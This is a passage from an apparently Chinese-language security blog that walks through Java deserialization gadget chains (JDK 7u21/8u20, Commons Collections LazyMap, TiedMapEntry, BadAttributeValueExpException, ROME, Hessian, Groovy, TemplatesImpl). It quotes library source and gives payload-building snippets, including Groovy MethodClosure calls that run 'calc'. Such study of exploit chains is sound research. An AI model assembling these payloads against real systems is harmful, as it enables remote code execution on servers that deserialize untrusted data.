class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//Hashtable 的 readObject 方法</span><br><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">       ………………</span><br><span class="line">        for (; elements &gt; 0; elements--) &#123;</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line"></span><br><span class="line">            //reconstitutionPut方法</span><br><span class="line">            reconstitutionPut(newTable, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        this.table = newTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//跟进 reconstitutionPut 方法</span><br><span class="line">    private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value)</span><br><span class="line">        throws StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        if (value == null) &#123;</span><br><span class="line">            throw new java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int hash = hash(key);</span><br><span class="line">        int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">        for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123;</span><br><span class="line"></span><br><span class="line">            //注意这里的 equals 方法</span><br><span class="line">            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                throw new java.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // Creates the new entry.</span><br><span class="line">        Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">        tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>跟进上面的 equals 方法，发现最终调用了 AbstractMap 类的 equals 方法，如下：</p>
<h3 id="LinkedHashSet-HashSet原生类-source-动态代理-任意方法get-7u21-8u20"><a href="#LinkedHashSet-HashSet原生类-source-动态代理-任意方法get-7u21-8u20" class="headerlink" title="(LinkedHashSet)HashSet原生类  source-&gt;动态代理-&gt;任意方法get  7u21|8u20"></a>(LinkedHashSet)HashSet原生类  source-&gt;动态代理-&gt;任意方法get  7u21|8u20</h3><h5 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in any hidden serialization magic</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read in HashMap capacity and load factor and create backing HashMap</span><br><span class="line">    int capacity = s.readInt();</span><br><span class="line">    float loadFactor = s.readFloat();</span><br><span class="line">    map = (((HashSet)this) instanceof LinkedHashSet ?</span><br><span class="line">           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           new HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    // Read in size</span><br><span class="line">    int size = s.readInt();</span><br><span class="line"></span><br><span class="line">    // Read in all elements in the proper order.</span><br><span class="line">    for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);   // 重点在这里 跟进put方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    if (key == null)</span><br><span class="line">        return putForNullKey(value);</span><br><span class="line">    int hash = hash(key);</span><br><span class="line">    int i = indexFor(hash, table.length);</span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;   //key.equals(k)，如果让k是代理对象，k是我们的恶意TemplatesImpl的话，就可以和上面的分析接上了，成功命令执行。</span><br><span class="line">        //后面太精妙了 具体看https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DJDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%A6%E4%B9%A0.md</span><br><span class="line">        //他想到让memberValues这个Map只有一个键值对，让key的hash为0，这样127*0=0，然后0^xxx仍然是xxx（相同为0，不同为1）。再让value是恶意的TemplatesImpl对象，这样计算的就是那个TemplatesImpl对象的hash值，自然就相同了。tttttql。至于hash为0的键，找到的是f5a5a608。</span><br><span class="line">        ......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修复方案：<br> innotationInvocationHandler在readObject时会检查this.type，而这里为了控制type一定会报错</p>
<p>修复前在只是把函数return，但由于已经defaultReadObject，对反序列化流程没有影响。而修复后后直接丢异常。</p>
<h5 id="8u20-LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。"><a href="#8u20-LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。" class="headerlink" title="8u20  LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。"></a>8u20  LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。</h5><p>1.反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是会抛弃掉这个成员。</p>
<p>2.每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用TC_REFERENCE结构,引用前面handle的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>8中的修复方式相对更治标一些:</p>
<p>使用 readFields 替换了之前的 defaultReadObject ，这样一来就没有可以引用的东西了，8u20 自然无从谈起。</p>
<h4 id="那么这个类想利用的话就"><a href="#那么这个类想利用的话就" class="headerlink" title="那么这个类想利用的话就"></a>那么这个类想利用的话就</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; memberValues = new HashMap&lt;String, Object&gt;();</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,&quot;feng&quot;);</span><br><span class="line">Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">cons.setAccessible(true);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)cons.newInstance(Templates.class, memberValues);</span><br><span class="line">HashSet hashSet = new LinkedHashSet();</span><br><span class="line">hashSet.add(templates);  //templates 是上面的对象</span><br><span class="line">Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),new Class[]&#123;Templates.class&#125;,handler);</span><br><span class="line">hashSet.add(proxy);</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,templates);</span><br></pre></td></tr></table></figure>
<h3 id="TiedMapEntry-原生类-前-BadAttributeValueExpException-toString-HashMap-hashCode-后-TiedMapEntry-toString-hashCode-可触发-LazyMap-get"><a href="#TiedMapEntry-原生类-前-BadAttributeValueExpException-toString-HashMap-hashCode-后-TiedMapEntry-toString-hashCode-可触发-LazyMap-get" class="headerlink" title="TiedMapEntry 原生类  前 BadAttributeValueExpException-&gt;toString   HashMap-&gt;hashCode()后    TiedMapEntry.toString()|hashCode()  可触发 LazyMap.get()"></a>TiedMapEntry 原生类  前 BadAttributeValueExpException-&gt;toString   HashMap-&gt;hashCode()后    TiedMapEntry.toString()|hashCode()  可触发 LazyMap.get()</h3><h4 id="tostring-后-get"><a href="#tostring-后-get" class="headerlink" title="tostring   后 get()"></a>tostring   后 get()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Entry, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID = -8453869361373831205L;</span><br><span class="line">    private final Map map;</span><br><span class="line">    private final Object key;</span><br><span class="line"></span><br><span class="line">    //构造函数，显然我们可以控制 this.map 为 LazyMap</span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">        this.map = map;</span><br><span class="line">        this.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //toString函数，注意这里调用了 getValue()</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return this.getKey() + &quot;=&quot; + this.getValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span><br><span class="line">    public Object getValue() &#123;</span><br><span class="line">        return this.map.get(this.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="hashcode-后-get"><a href="#hashcode-后-get" class="headerlink" title="hashcode() 后 get()"></a>hashcode() 后 get()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Entry, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID = -8453869361373831205L;</span><br><span class="line">    private final Map map;</span><br><span class="line">    private final Object key;</span><br><span class="line"></span><br><span class="line">    //构造函数，显然我们可以控制 this.map 为 LazyMap</span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">        this.map = map;</span><br><span class="line">        this.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //hashCode函数，注意这里调用了 getValue()</span><br><span class="line">    public int hashCode() &#123;</span><br><span class="line">        Object value = this.getValue();</span><br><span class="line">        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span><br><span class="line">    public Object getValue() &#123;</span><br><span class="line">        return this.map.get(this.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用衔接还是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="原生类-HashMap-后可调-hashcode"><a href="#原生类-HashMap-后可调-hashcode" class="headerlink" title="原生类 HashMap  后可调 hashcode()"></a>原生类 HashMap  后可调 hashcode()</h3><p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//通过反射设置真的 transformer 数组</span><br><span class="line">Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(chainedTransformer, transformers);</span><br><span class="line">//清空由于 hashMap.put 对 LazyMap 造成的影响</span><br><span class="line">lazyMap.clear();</span><br></pre></td></tr></table></figure>

<h3 id="原生类-BadAttributeValueExpException-后-tostring"><a href="#原生类-BadAttributeValueExpException-后-tostring" class="headerlink" title="原生类 BadAttributeValueExpException  后 tostring()"></a>原生类 BadAttributeValueExpException  后 tostring()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class BadAttributeValueExpException extends Exception   &#123;</span><br><span class="line">    private Object val;     //这里可以控制 val 为 TiedMapEntry</span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">        if (valObj == null) &#123;</span><br><span class="line">            val = null;</span><br><span class="line">        &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; else if (System.getSecurityManager() == null</span><br><span class="line">                || valObj instanceof Long</span><br><span class="line">                || valObj instanceof Integer</span><br><span class="line">                || valObj instanceof Float</span><br><span class="line">                || valObj instanceof Double</span><br><span class="line">                || valObj instanceof Byte</span><br><span class="line">                || valObj instanceof Short</span><br><span class="line">                || valObj instanceof Boolean) &#123;</span><br><span class="line">            val = valObj.toString();    //这里是关键点，调用toString()</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//BadAttributeValueExpException 实例</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">//反射设置 val</span><br><span class="line">Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">val.setAccessible(true);</span><br><span class="line">val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">//当反序列化时，会自动badAttributeValueExpException.toString</span><br></pre></td></tr></table></figure>
<h3 id="Hessian-作为链的source点-后跟-HashMap-put-而hashMap-put后面可跟其他链"><a href="#Hessian-作为链的source点-后跟-HashMap-put-而hashMap-put后面可跟其他链" class="headerlink" title="Hessian    作为链的source点  后跟 HashMap.put 而hashMap.put后面可跟其他链"></a>Hessian    作为链的source点  后跟 HashMap.put 而hashMap.put后面可跟其他链</h3><p>Hessian  是一个rpc框架<br>HashMap.put()<br>MapDeserializer.readMap()<br>SerializerFactory.readMap()<br>Hessian2Input.readObject()<br>可以看出</p>
<h4 id="配合ROME"><a href="#配合ROME" class="headerlink" title="配合ROME"></a>配合ROME</h4><h5 id="配合Spring-PartiallyComparableAdvisorHolder链"><a href="#配合Spring-PartiallyComparableAdvisorHolder链" class="headerlink" title="配合Spring PartiallyComparableAdvisorHolder链"></a>配合Spring PartiallyComparableAdvisorHolder链</h5><h5 id="配合Spring-AbstractBeanFactoryPointcutAdvisor链"><a href="#配合Spring-AbstractBeanFactoryPointcutAdvisor链" class="headerlink" title="配合Spring AbstractBeanFactoryPointcutAdvisor链"></a>配合Spring AbstractBeanFactoryPointcutAdvisor链</h5><h5 id="配合Resin链"><a href="#配合Resin链" class="headerlink" title="配合Resin链"></a>配合Resin链</h5><h5 id="配合XBean链"><a href="#配合XBean链" class="headerlink" title="配合XBean链"></a>配合XBean链</h5><h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><h5 id="前-HashMap-hash-HashTable-reconstitutionPut-BadAttributeValueExpExcepti——-EqualsBean"><a href="#前-HashMap-hash-HashTable-reconstitutionPut-BadAttributeValueExpExcepti——-EqualsBean" class="headerlink" title="前 HashMap.hash|HashTable.reconstitutionPut|BadAttributeValueExpExcepti——&gt;EqualsBean |"></a>前 HashMap.hash|HashTable.reconstitutionPut|BadAttributeValueExpExcepti——&gt;EqualsBean |</h5><h6 id="前-有AOC时-HotSwappableTargetSource-ToStringBean-toString《—-XString-equals-《—HotSwappableTargetSource-equals"><a href="#前-有AOC时-HotSwappableTargetSource-ToStringBean-toString《—-XString-equals-《—HotSwappableTargetSource-equals" class="headerlink" title="前   有AOC时 HotSwappableTargetSource  ToStringBean.toString《—-XString.equals()《—HotSwappableTargetSource.equals()"></a>前   有AOC时 HotSwappableTargetSource  ToStringBean.toString《—-XString.equals()《—HotSwappableTargetSource.equals()</h6><h6 id="后-ToStringBean-toString—–-TemplatesImpl-getOutputProperties-。"><a href="#后-ToStringBean-toString—–-TemplatesImpl-getOutputProperties-。" class="headerlink" title="后 ToStringBean.toString—–&gt;TemplatesImpl.getOutputProperties()   。"></a>后 ToStringBean.toString—–&gt;TemplatesImpl.getOutputProperties()   。</h6><h6 id="后-有-JDBCRowset-ToStringBean-toString-JdbcRowSetImpl-getDatabaseMetaData"><a href="#后-有-JDBCRowset-ToStringBean-toString-JdbcRowSetImpl-getDatabaseMetaData" class="headerlink" title="后  有 JDBCRowset   ToStringBean.toString-&gt;JdbcRowSetImpl.getDatabaseMetaData()"></a>后  有 JDBCRowset   ToStringBean.toString-&gt;JdbcRowSetImpl.getDatabaseMetaData()</h6><h5 id="AbstractMap-EqualsBean-TemplatesImpl"><a href="#AbstractMap-EqualsBean-TemplatesImpl" class="headerlink" title="AbstractMap-&gt;EqualsBean-&gt;TemplatesImpl"></a>AbstractMap-&gt;EqualsBean-&gt;TemplatesImpl</h5><h3 id="LazyMap原生类-后-transform-即CC-前-AnnotationInvocationHandler-TiedMapEntry"><a href="#LazyMap原生类-后-transform-即CC-前-AnnotationInvocationHandler-TiedMapEntry" class="headerlink" title="LazyMap原生类  后 transform() 即CC  前  AnnotationInvocationHandler|TiedMapEntry"></a>LazyMap原生类  后 transform() 即CC  前  AnnotationInvocationHandler|TiedMapEntry</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 7990956402564206740L;</span><br><span class="line">    protected final Transformer factory;</span><br><span class="line"></span><br><span class="line">    //可控制 factory 为 ChainedTransformer</span><br><span class="line">    public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="line">        return new LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected LazyMap(Map map, Transformer factory) &#123;</span><br><span class="line">        super(map);</span><br><span class="line">        if (factory == null) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //利用 get 方法可实现调用 ChainedTransformer#transform()</span><br><span class="line">    public Object get(Object key) &#123;</span><br><span class="line">        if (!super.map.containsKey(key)) &#123;</span><br><span class="line">            //关键点</span><br><span class="line">            Object value = this.factory.transform(key);</span><br><span class="line">            super.map.put(key, value);</span><br><span class="line">            return value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return super.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="get-方法-后-transform-前-AnnotationInvocationHandler"><a href="#get-方法-后-transform-前-AnnotationInvocationHandler" class="headerlink" title="get()方法   后  transform()  前 AnnotationInvocationHandler"></a>get()方法   后  transform()  前 AnnotationInvocationHandler</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map uselessMap = new HashMap();     # LazyMap.decorate()用于转对象类型。</span><br><span class="line">//这里有一点坑 map.put(&quot;value&quot;,&quot;gxngxngxn&quot;);   </span><br><span class="line">uselessMap.put(&quot;value&quot;,&quot;gxngxngxn&quot;); </span><br><span class="line">Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);   # 这里chainedTransformer从上面找</span><br><span class="line">lazyMap.get(&quot;test&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><h4 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h4><p>构造方法接收两个参数，一个是对象，一个是对象的方法名，这个类有一个doCall方法传入一个参数，通过InvokerHelper.invokeMethod调用方法，但是这个方法是private私有属性，我们不能直接调用，我们可以通过反射调用doCall</p>
<pre><code>  MethodClosure exec = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);
    Method doCall = MethodClosure.class.getDeclaredMethod(&quot;doCall&quot;, Object.class);
    doCall.setAccessible(true);
    doCall.invoke(exec, &quot;calc&quot;);
</code></pre>
<h4 id="String-execute"><a href="#String-execute" class="headerlink" title="String.execute()"></a>String.execute()</h4><pre><code>MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
methodClosure.call();
</code></pre>
<h4 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h4><p>用于将闭包适配到 Java 接口，他继承了ConversionHandler，而ConversionHandler又实现了InvocationHandler接口，所以这就是一个动态代理类</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><pre><code>    MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
    ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);
    //反射获取AnnotationInvocationHandler构造方法
    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    //动态代理
    Map map = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]&#123;Map.class&#125;, convertedClosure);
    //初始化
    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
    //序列化
    String serialize = serialize(invocationHandler);
    System.out.println(serialize);
    //反序列化
    unserialize(serialize);
</code></pre>
<h3 id="TemplatesImpl依赖-newTransformer-RCE"><a href="#TemplatesImpl依赖-newTransformer-RCE" class="headerlink" title="TemplatesImpl依赖     newTransformer &#x3D; RCE"></a>TemplatesImpl依赖     newTransformer &#x3D; RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public final class TemplatesImpl implements Templates, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private String _name = null;</span><br><span class="line">    private byte[][] _bytecodes = null;</span><br><span class="line">    private transient TransformerFactoryImpl _tfactory = null;</span><br><span class="line"></span><br><span class="line">    //关键方法：newTransformer()</span><br><span class="line">    public synchronized Transformer newTransformer()</span><br><span class="line">                throws TransformerConfigurationException</span><br><span class="line">            &#123;</span><br><span class="line">                TransformerImpl transformer;</span><br><span class="line">                // 关键点，调用 getTransletInstance()</span><br><span class="line">                transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">                    _indentNumber, _tfactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //继续跟进 getTransletInstance() 方法：</span><br><span class="line">    private Translet getTransletInstance()</span><br><span class="line">        throws TransformerConfigurationException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (_name == null) return null;</span><br><span class="line"></span><br><span class="line">            //先判断是否为 null，如果为 null 的话去加载字节码，紧接着 newInstance() 对其实例化。</span><br><span class="line">            if (_class == null) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            …………</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //继续跟进 defineTransletClasses() 方法:</span><br><span class="line">    private void defineTransletClasses()</span><br><span class="line">        throws TransformerConfigurationException &#123;</span><br><span class="line">        …………</span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">                public Object run() &#123;</span><br><span class="line">                    return new 